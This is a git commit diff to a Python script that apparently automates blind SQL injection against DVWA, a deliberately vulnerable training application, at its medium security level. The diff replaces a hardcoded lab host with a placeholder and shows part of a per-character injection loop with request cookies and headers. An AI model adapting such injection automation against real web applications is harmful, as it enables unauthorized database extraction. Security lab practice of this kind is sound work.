2bc3ba831f9e51700ce5ad1d9e3fe4e247920dca
Cody Winkler <45709553+cwinfosec@users.noreply.github.com>
2020-10-09 02:21:02 -0500

    Update med_bsqli.py

--- DVWA/med_bsqli.py
+++ DVWA/med_bsqli.py
@@ -15,7 +15,7 @@ def loop_inject(original_inject):
         edit_inject = original_inject.replace("CHAR", str(ord(char)))
 
 
-        burp_url = "http://lab:80/vulnerabilities/sqli_blind/"
+        burp_url = "http://YOUR_DVWA:80/vulnerabilities/sqli_blind/"    # change this for your DVWA host
         burp_cookies = {"PHPSESSID": "", "security": "medium"}    # fix this
         burp_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",
